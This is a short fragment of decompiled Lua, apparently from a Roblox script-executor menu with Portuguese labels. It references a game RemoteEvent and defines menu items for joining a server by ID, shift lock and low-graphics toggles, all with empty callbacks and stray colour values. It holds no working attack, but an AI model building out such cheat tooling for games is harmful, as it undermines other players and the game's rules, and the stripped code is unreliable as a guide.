    Color3.new(1, 0, 0)
    Color3.new(0, 1, 0)
    Color3.new(0, 0, 1)
    Color3.new(1, 1, 0)
    Color3.new(1, 0, 1)
    Color3.new(0, 1, 1)
    Color3.new(0.5, 0, 0.5)
    Color3.new(1, 0.5, 0)
    game:GetService('ReplicatedStorage'):WaitForChild('RE'):WaitForChild('1Player1sCa1r')
    _call442:AddSection({
        Name = 'CONFIG',
    })
    _call442:AddTextBox({
        PlaceholderText = 'DIGITE O ID DO SERVIDOR',
        Name = 'ENTRAR NO SERVIDOR',
        Callback = function(_1201) end,
    })
    _call442:AddButton({
        Name = 'COPIAR ID DO SERVIDOR',
        Callback = function() end,
    })
    _call442:AddButton({
        Name = 'SHIFT LOK',
        Callback = function() end,
    })
    _call442:AddSection({
        Name = 'CONFIG FPS',
    })
    _call442:AddToggle({
        Name = 'GRAFICO LITE SEM SKIN',
        Callback = function(_1212) end,
    })
    _call442:AddToggle({
        Name = 'GRAFICO LITE COM SKIN',
        Callback = function(_1215) end,
    })
end
